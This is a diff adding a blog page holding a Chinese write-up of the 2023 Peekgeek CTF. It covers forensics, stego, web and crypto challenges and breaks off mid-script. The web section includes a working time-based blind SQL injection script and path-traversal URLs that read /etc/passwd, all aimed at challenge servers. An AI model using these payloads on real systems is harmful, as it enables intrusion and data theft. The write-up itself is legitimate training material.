+      links.forEach(link => link.classList.remove('active'));
+      
+      const activeLink = document.querySelector('.toc-link[href="#' + targetId + '"]');
+      if (activeLink) {
+        activeLink.classList.add('active');
+        
+        if (window.location.hash.slice(1) !== targetId) {
+          history.replaceState(null, '', '#' + targetId);
+        }
+      }
+    }
+
+    // 设置平滑滚动
+    links.forEach(link => {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const targetId = href.slice(1);
+          scrollToElement(targetId);
+        }
+      });
+    });
+
+    // 设置交集观察器
+    const observer = new IntersectionObserver(
+      function(entries) {
+        const visibleEntries = entries.filter(entry => entry.isIntersecting);
+        if (visibleEntries.length > 0) {
+          const visibleEntry = visibleEntries.reduce(function(prev, current) {
+            return prev.boundingClientRect.top < current.boundingClientRect.top ? prev : current;
+          });
+          setActiveLink(visibleEntry.target.id);
+        }
+      },
+      { rootMargin: '-10% 0px -70% 0px' }
+    );
+
+    headings.forEach(function(heading) {
+      observer.observe(heading);
+    });
+
+    // 处理初始哈希
+    function handleInitialHash() {
+      const hash = window.location.hash;
+      if (hash) {
+        setTimeout(function() {
+          const targetId = hash.slice(1);
+          scrollToElement(targetId);
+          setActiveLink(targetId);
+        }, 300); // 增加延迟时间，确保页面完全加载
+      }
+    }
+
+    // 处理哈希变化
+    function handleHashChange() {
+      const hash = window.location.hash;
+      if (hash) {
+        const targetId = hash.slice(1);
+        scrollToElement(targetId);
+        setActiveLink(targetId);
+      }
+    }
+
+    // 确保在不同加载阶段都能正确处理锚点
+    handleInitialHash();
+    window.addEventListener('popstate', handleInitialHash);
+    window.addEventListener('hashchange', handleHashChange);
+    
+    // 页面完全加载后再次检查
+    window.addEventListener('load', function() {
+      setTimeout(handleInitialHash, 100);
+    });
+  }
+
+  // 初始化
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTableOfContents);
+  } else {
+    initTableOfContents();
+  }
+</script>  <div class="lightbox-wrapper" data-astro-cid-vqtgpguw>  <section id="article" class="prose prose-lg max-w-none dark:prose-invert" aria-label="文章正文">   <h2 id="misc">Misc</h2>
+<h3 id="welcome">welcome</h3>
+<blockquote>
+<p>极客荟萃，逐梦巅峰！欢迎大家参加中国电信·2023“巅峰极客”网络安全技能挑战赛。
+本场比赛空调已开放.jpg，请各位选手提交flag凭证有序进入。<!--more-->
+flag凭证如下：
+ZmxhZ3tQZWVrZ2Vla18xc19BX0dyM2E3X2VWZW43X2Ywcl9ldjNyeV9DVEZlcn0=</p>
+</blockquote>
+<p>直接 <code>Base64</code> 解码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>flag{Peekgeek_1s_A_Gr3a7_eVen7_f0r_ev3ry_CTFer}</span></span></code></pre>
+<h3 id="foundme">foundme</h3>
+<blockquote>
+<p>I made an image that I really liked with my favorite flag, but the computer accidentally shut down, but fortunately I saved the dump file.</p>
+</blockquote>
+<p>直接 010 打开检索 flag 得到一段提示</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>It's just a dump file, and you've found a new lead Maybe you know the Netflix picture format? Hope this hint helps you. Search for more information to find the flag!</span></span></code></pre>
+<p>同时发现一个文件 <code>FFFFFFLAG.AVIF</code></p>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230721174012663.png" alt="image-20230721174012663"></p>
+<p>直接百度找了一个图片在线转 <code>AVIF</code> 的网站，然后查看文件头为一下内容(第四位不固定，所以我们直接搜后四位)</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>00 00 00 xx 66 74 79 70</span></span></code></pre>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230721174439483.png" alt="image-20230721174439483"></p>
+<p>找到了文件头但是找不到文件尾，直接不管那么多，随缘复制然后导出为 <code>avif</code> 即可，照片查看器有容错机制</p>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230721174540922.png" alt="image-20230721174540922"></p>
+<h3 id="song">song</h3>
+<blockquote>
+<p>网易云，上号！</p>
+</blockquote>
+<p>直接 <code>010</code> 搜索附件找到 <code>flag.txt</code>文件，但是 <code>binwalk</code> 分离不出压缩包</p>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230721174807634.png" alt="image-20230721174807634"></p>
+<p>后来直接开头前五位改写为 <code>50 4b 03 04 14</code> 同时后缀改为 zip 正常打开了，解压后全局搜索 <code>flag</code> 发现 <code>docProps\app.xml</code> 里面提示 <code>Flag in Netease cloud</code></p>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230721205223638.png" alt="image-20230721205223638"></p>
+<p>同时在 <code>docProps\thumbnail.jpe</code> 分离出一个压缩包</p>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230721205717439.png" alt="image-20230721205717439"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>Please do not try to burst the password!!!!!!!!</span></span></code></pre>
+<p>同时在 <code>password_hint.txt</code> 得到一串编码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>9iZ!r@n(9KAQV])&#x3C;,6_K:,$L-&#x3C;`N0U>'`J\@;A:f@X:pc;__&#x3C;N;f->);/8c[&#x3C;(K>S=u&#x26;Q&#x3C;&#x3C;C\oJA2-DK9l+cpAQMnd;/LD5=&#x26;s-8@T?rP;cdd':,$@!;_g1U&#x3C;ARX#;)&#x3C;$*;/J0E@P^bo;f-JGAQ3=t:/tFO@r$$s9gs:q@kgl'&#x3C;`Lh:</span></span></code></pre>
+<p>直接 <code>CyberChef</code> 梭掉，另外最后需要选择一下编码为 <code>UFT-8</code> 否则乱码</p>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230721210329379.png" alt="image-20230721210329379"></p>
+<p>然后在 <code>ppt/media</code> 目录发现一个大小异常的图片 <code>image4.png</code></p>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230721205039320.png" alt="image-20230721205039320"></p>
+<p>其中 <code>image4.png</code> 和 <code>image5.png</code> 图片除文件大小为，其他一模一样(内容和宽高)，通过 <code>010</code> 观察两个文件发现 <code>image4.png</code> 是在 <code>image5.png</code> 的基础上插入了大量的内容，通过比对文件尾发现插入其他内容的 hex 如下所示</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>C7FF038FBFE300A4F7141C&#x3C;插入的内容>0000000049454E44AE426082</span></span></code></pre>
+<p>直接编写代码取出插入的部分，然后转换为文件</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> binascii</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'image4.png'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'rb'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">    hex_data </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> binascii.hexlify(f.read()).decode().upper()</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">start_idx </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> hex_data.find(</span><span style="color:#9ECBFF">'C7FF038FBFE300A4F7141C'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">end_idx </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> hex_data.find(</span><span style="color:#9ECBFF">'0000000049454E44AE426082'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="8"></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">data </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> binascii.unhexlify(hex_data[start_idx </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 22</span><span style="color:#E1E4E8">:end_idx])</span></span>
+<span class="line" data-line="10"></span>
+<span class="line" data-line="11"><span style="color:#F97583">with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'output'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'wb'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">    f.write(data)</span></span></code></pre>
+<p>直接通过 <code>file</code> 命令分析一波</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line" data-line="1"><span style="color:#B392F0">┌──(kali㉿kali</span><span style="color:#E1E4E8">)-[~/Desktop]</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">└─$</span><span style="color:#9ECBFF"> file</span><span style="color:#9ECBFF"> output</span></span>
+<span class="line" data-line="3"><span style="color:#B392F0">output:</span><span style="color:#9ECBFF"> Monkey's Audio compressed format version 3990 with high compression, stereo, sample rate 44100</span></span></code></pre>
+<p>百度检索 <code>Monkey's Audio</code> 发现文件后缀格式应该为 <code>.ape</code> 且是一个音频文件，我们直接后缀改为 <code>.ape</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>Monkey's Audio是一种无损压缩技术的软件，常被用来解压缩APE格式的无损音乐文件，APE是流行的数字音乐文件格式之一。</span></span></code></pre>
+<p>直接使用 <code>Deepsound </code> 进行解密(这隐写软件只在 VishwaCTF 2023 里面用过，幸好隔得时间不长没忘记)，直接导入文件，提示输入密码</p>
+<p>结合 <code>password_hint.txt</code> 得到的信息直接弱密码 <code>123456</code> 解密成功</p>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230722140919082.png" alt="image-20230722140919082"></p>
+<p>得到的 <code>password.txt</code> 文件内容为 <code>Ook</code> 编码，直接解码后得到密码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>this_zip_password_is_QazWsx147!@#</span></span></code></pre>
+<p>最终解压我们最初分离出的文件得到 flag</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>flag{lW9tUyrh8RzzvysrswAwY7MHR4mmbLSt}</span></span></code></pre>
+<h2 id="web">Web</h2>
+<h3 id="hellosql">hellosql</h3>
+<p>笛卡尔积，导致时间盲注</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> requests</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> time</span></span>
+<span class="line" data-line="3"></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">url </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "http://web-2f7d23ba90.challenge.xctf.org.cn/index.php?id="</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">flag </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ""</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#F97583">def</span><span style="color:#B392F0"> str2hex</span><span style="color:#E1E4E8">(str):</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">    hex1</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'0x'</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> str</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">        hex1</span><span style="color:#F97583">+=</span><span style="color:#79B8FF">hex</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(i))[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:]</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> hex1</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">result</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span></span>
+<span class="line" data-line="13"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">) :</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">    time.sleep(</span><span style="color:#79B8FF">0.1</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">    low </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 32</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">    high </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 127</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">    mid </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (low </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> high) </span><span style="color:#F97583">//</span><span style="color:#79B8FF"> 2</span></span>
+<span class="line" data-line="18"></span>
+<span class="line" data-line="19"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (low </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> high):</span></span>
+<span class="line" data-line="20"></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">        payload </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "' OR CASE WHEN ASCII(SUBSTR((SELECT(group_concat(Flagg))from(ctf.Flllag)),</span><span style="color:#79B8FF">{}</span><span style="color:#9ECBFF">,1))></span><span style="color:#79B8FF">{}</span><span style="color:#9ECBFF"> THEN (SELECT MAX(A.TABLE_NAME) FROM information_schema.columns A, information_schema.columns B) END#"</span><span style="color:#E1E4E8">.format(i, mid)</span></span>
+<span class="line" data-line="22"></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">        start_time </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> time.time()</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">        r </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> requests.get(</span><span style="color:#FFAB70">url</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">url,</span><span style="color:#FFAB70">params</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="25"><span style="color:#9ECBFF">            "id"</span><span style="color:#E1E4E8">:payload</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">        },)</span></span>
+<span class="line" data-line="27"><span style="color:#E1E4E8">        end_time </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> time.time()</span></span>
+<span class="line" data-line="28"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(end_time</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">start_time)</span></span>
+<span class="line" data-line="29"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (end_time </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> start_time) </span><span style="color:#F97583">>=</span><span style="color:#79B8FF"> 0.5</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="30"><span style="color:#E1E4E8">            low </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> mid </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span></span>
+<span class="line" data-line="31"></span>
+<span class="line" data-line="32"><span style="color:#F97583">        else</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="33"><span style="color:#E1E4E8">            high </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> mid</span></span>
+<span class="line" data-line="34"><span style="color:#E1E4E8">        mid </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (low </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> high) </span><span style="color:#F97583">//</span><span style="color:#79B8FF"> 2</span></span>
+<span class="line" data-line="35"></span>
+<span class="line" data-line="36"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> mid </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 32</span><span style="color:#F97583"> or</span><span style="color:#E1E4E8"> mid </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 127</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="37"><span style="color:#F97583">        break</span></span>
+<span class="line" data-line="38"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(i)</span></span>
+<span class="line" data-line="39"><span style="color:#E1E4E8">    flag </span><span style="color:#F97583">+=</span><span style="color:#79B8FF"> chr</span><span style="color:#E1E4E8">(mid)</span></span>
+<span class="line" data-line="40"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(flag)</span></span></code></pre>
+<h3 id="hinder">hinder</h3>
+<blockquote>
+<p>路由为/hinder</p>
+</blockquote>
+<p>我们尝试双写 <code>//</code> 得到一个 hint</p>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230721175342902.png" alt="image-20230721175342902"></p>
+<p>经过测试发现存在任意文件下载，但是经过 FUZZ 以及读取环境变量等操作，并未发现 flag</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>//hinder/download.action?filename=../../../../../../../../../../../../etc/passwd</span></span></code></pre>
+<p>最终通过读取未删除的 <code>/run.sh</code> 文件得到 flag 存在于 <code>oh_u_f1nd_me</code> 文件中</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#6A737D">#!/bin/sh</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#6A737D">#echo $FLAG > /oh_u_f1nd_me</span></span>
+<span class="line" data-line="4"><span style="color:#79B8FF">FLAG</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">not_here</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">export </span><span style="color:#79B8FF">FLAG</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">not_here</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">/</span><span style="color:#E1E4E8">usr</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">local</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tomcat</span><span style="color:#F97583">/</span><span style="color:#79B8FF">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">catalina.sh run</span></span></code></pre>
+<hr>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>//hinder/download.action?filename=../../../../../../../../../../../../oh_u_f1nd_me</span></span></code></pre>
+<h2 id="crypto">Crypto</h2>
+<h3 id="数学但高中">数学但高中</h3>
+<blockquote>
+<p>来感受一下画图的乐趣，没有字母’o’</p>
+</blockquote>
+<p>在 <a href="https://www.desmos.com/calculator?lang=zh-CN">desmos</a> 中输入附件给出的函数即可</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>flag{Funct10n_Fun}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/peekgeek-2023/image-20230722142542057.png" alt="image-20230722142542057"></p>
+<h3 id="simple_encryption">Simple_encryption</h3>
+<blockquote>
+<p>一起学数学</p>
+</blockquote>
+<p>第一段：原题 <a href="https://blog.csdn.net/weixin_44110537/article/details/107427363">[V&#x26;N2020 公开赛]Fast</a></p>
+<p>第二段：一元copper</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> gmpy2</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> binascii</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> sympy </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> Symbol, solve</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> Crypto.Util.number </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> long_to_bytes</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">c1</span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 19024563955839349902897822692180949371550067644378624199902067434708278125346234824900117853598997270022872667319428613147809325929092749312310446754419305096891122211944442338664613779595641268298482084259741784281927857614814220279055840825157115551456554287395502655358453270843601870807174309121367449335110327991187235786798374254470758957844690258594070043388827157981964323699747450405814713722613265012947852856714100237325256114904705539465145676960232769502207049858752573601516773952294218843901330100257234517481221811887136295727396712894842769582824157206825592614684804626241036297918244781918275524254</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">c2</span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 11387447548457075057390997630590504043679006922775566653728699416828036980076318372839900947303061300878930517069527835771992393657157069014534366482903388936689298175411163666849237525549902527846826224853407226289495201341719277080550962118551001246017511651688883675152554449310329664415179464488725227120033786305900106544217117526923607211746947511746335071162308591288281572603417532523345271340113176743703809868369623401559713179927002634217140206608963086656140258643119596968929437114459557916757824682496866029297120246221557017875892921591955181714167913310050483382235498906247018171409256534124073270350</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">N</span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 21831630625212912450058787218272832615084640356500740162478776482071876178684642739065105728423872548532056206845637492058465613779973193354996353323494373418215019445325632104575415991984764454753263189235376127871742444636236132111097548997063091478794422370043984009615893441148901566420508196170556189546911391716595983110030778046242014896752388438535131806524968952947016059907135882390507706966746973544598457963945671064540465259211834751973065197550500334726779434679470160463944292619173904064826217284899341554269864669620477774678605962276256707036721407638013951236957603286867871199275024050690034901963</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">g1</span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 20303501619435729000675510820217420636246553663472832286487504757515586157679361170332171306491820918722752848685645096611030558245362578422584797889428493611704976472409942840368080016946977234874471779189922713887914075985648876516896823599078349725871578446532134614410886658001724864915073768678394238725788245439086601955497248593286832679485832319756671985505398841701463782272300202981842733576006152153012355980197830911700112001441621619417349747262257225469106511527467526286661082010163334100555372381681421874165851063816598907314117035131618062582953512203870615406642787786668571083042463072230605649134</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">g2</span><span style="color:#F97583">=</span><span style="color:#79B8FF">14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span>
+<span class="line" data-line="11"></span>
+<span class="line" data-line="12"><span style="color:#F97583">def</span><span style="color:#B392F0"> decrypt</span><span style="color:#E1E4E8">(c1, c2):</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">    xp </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> c1 </span><span style="color:#F97583">%</span><span style="color:#E1E4E8"> p</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">    xq </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> c2 </span><span style="color:#F97583">%</span><span style="color:#E1E4E8"> q</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">    m </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (xp</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">gmpy2.invert(q, p)</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">q </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> xq</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">gmpy2.invert(p, q)</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">p) </span><span style="color:#F97583">%</span><span style="color:#E1E4E8"> N</span></span>
+<span class="line" data-line="16"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> m</span></span>
+<span class="line" data-line="17"></span>
+<span class="line" data-line="18"><span style="color:#E1E4E8">p </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.gcd(g1</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,N)</span></span>
+<span class="line" data-line="19"><span style="color:#E1E4E8">q </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.gcd(g2</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,N)</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">m </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> decrypt(c1,c2)</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">flag1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> binascii.unhexlify(</span><span style="color:#79B8FF">hex</span><span style="color:#E1E4E8">(m)[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:]).decode(</span><span style="color:#9ECBFF">'utf-8'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="22"></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">S</span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 234626762558445335519229319778735528295</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">N</span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 28053749721930780797243137464055357921262616541619976645795810707701031602793034889886420385567169222962145128498131170577184276590698976531070900776293344109534005057067680663813430093397821366071365221453788763262381958185404224319153945950416725302184077952893435265051402645871699132910860011753502307815457636525137171681463817731190311682277171396235160056504317959832747279317829283601814707551094074778796108136141845755357784361312469124392408642823375413433759572121658646203123677327551421440655322226192031542368496829102050186550793124020718643243789525477209493783347317576783265671566724068427349961101</span></span>
+<span class="line" data-line="25"><span style="color:#E1E4E8">e</span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 5</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">Cs</span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#79B8FF">1693447496400753735762426750097282582203894511485112615865753001679557182840033040705025720548835476996498244081423052953952745813186793687790496086492136043098444304128963237489862776988389256298142843070384268907160020751319313970887199939345096232529143204442168808703063568295924663998456534264361495136412078324133263733409362366768460625508816378362979251599475109499727808021609000751360638976</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">2240772849203381534975484679127982642973364801722576637731411892969654368457130801503103210570803728830063876118483596474389109772469014349453490395147031665061733965097301661933389406031214242680246638201663845183194937353509302694926811282026475913703306789097162693368337210584494881249909346643289510493724709324540062077619696056842225526183938442535866325407085768724148771697260859350213678910949</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">5082341111246153817896279104775187112534431783418388292800705085458704665057344175657566751627976149342406406594179073777431676597641200321859622633948317181914562670909686170531929552301852027606377778515019377168677204310642500744387041601260593120417053741977533047412729373182842984761689443959266049421034949822673159561609487404082536872314636928727833394518122974630386280495027169465342976</span><span style="color:#E1E4E8">]</span></span>
+<span class="line" data-line="27"></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">flag2 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span></span>
+<span class="line" data-line="29"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">):</span></span>
+<span class="line" data-line="30"><span style="color:#E1E4E8">    m1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.iroot(Cs[i], e)[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
+<span class="line" data-line="31"><span style="color:#E1E4E8">    s </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Symbol(</span><span style="color:#9ECBFF">'s'</span><span style="color:#E1E4E8">)</span></span>
